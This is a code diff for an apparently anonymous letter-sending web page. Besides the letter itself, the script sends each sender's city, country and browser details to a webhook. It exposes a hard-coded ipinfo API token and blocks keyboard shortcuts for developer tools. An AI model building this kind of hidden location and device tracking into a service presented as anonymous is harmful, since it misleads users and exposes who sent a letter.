@@ -5,34 +5,35 @@ function acceptConsent() {
   document.getElementById("mainApp").style.display = "block";
 }
 
-function submitLetter() {
+function sendLetter() {
+  const title = document.getElementById("titleInput").value.trim();
+  const message = document.getElementById("messageInput").value.trim();
   const status = document.getElementById("status");
-  const message = document.getElementById("letterInput").value.trim();
 
   if (localStorage.getItem("letter_sent") === "true") {
     status.textContent = "❌ 이미 편지를 보냈습니다. 다시 보낼 수 없습니다.";
     return;
   }
 
-  if (!message) {
-    status.textContent = "✏️ 편지 내용을 입력해주세요.";
+  if (!title || !message) {
+    status.textContent = "❗ 제목과 내용을 모두 입력해주세요.";
     return;
   }
 
   const deviceInfo = navigator.userAgent;
 
-  fetch("https://ipinfo.io/json?token=27854d1235c512")  // <-- 여기에 API 토큰 입력
-    .then(response => response.json())
+  fetch("https://ipinfo.io/json?token=27854d1235c512")
+    .then(res => res.json())
     .then(location => {
-      const cityInfo = `${location.city || "Unknown City"}, ${location.country || "Unknown Country"}`;
+      const cityInfo = `${location.city || "Unknown"}, ${location.country || "Unknown"}`;
 
-      const content = `📨 새 익명 편지 도착!\n\n💬 내용:\n${message}\n\n🌍 위치: ${cityInfo}\n💻 기기: ${deviceInfo}`;
+      const content = `📬 새 익명 편지 도착!\n\n📌 제목: ${title}\n💬 내용: ${message}\n\n📍 위치: ${cityInfo}\n💻 기기: ${deviceInfo}`;
 
       return fetch(webhookURL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          username: "Anonymous Letter Bot",
+          username: "익명 편지 봇",
           content: content
         })
       });
@@ -41,9 +42,10 @@ function submitLetter() {
       if (res.ok) {
         status.textContent = "✅ 편지가 성공적으로 전송되었습니다.";
         localStorage.setItem("letter_sent", "true");
-        document.getElementById("letterInput").value = "";
+        document.getElementById("titleInput").value = "";
+        document.getElementById("messageInput").value = "";
       } else {
-        status.textContent = "⚠️ 전송에 실패했습니다. 잠시 후 다시 시도해주세요.";
+        status.textContent = "⚠️ 전송 실패. 다시 시도해주세요.";
       }
     })
     .catch(err => {
@@ -51,7 +53,7 @@ function submitLetter() {
     });
 }
 
-// F12, Ctrl+U, Ctrl+Shift+I 방지
+// 개발자 도구 방지
 document.addEventListener("keydown", function (e) {
   if (
     e.key === "F12" ||
@@ -59,6 +61,6 @@ document.addEventListener("keydown", function (e) {
     (e.ctrlKey && e.key.toLowerCase() === "u")
   ) {
     e.preventDefault();
-    alert("🚫 개발자 도구 사용이 제한되어 있습니다.");
+    alert("🚫 개발자 도구 사용이 제한되었습니다.");
   }
 });
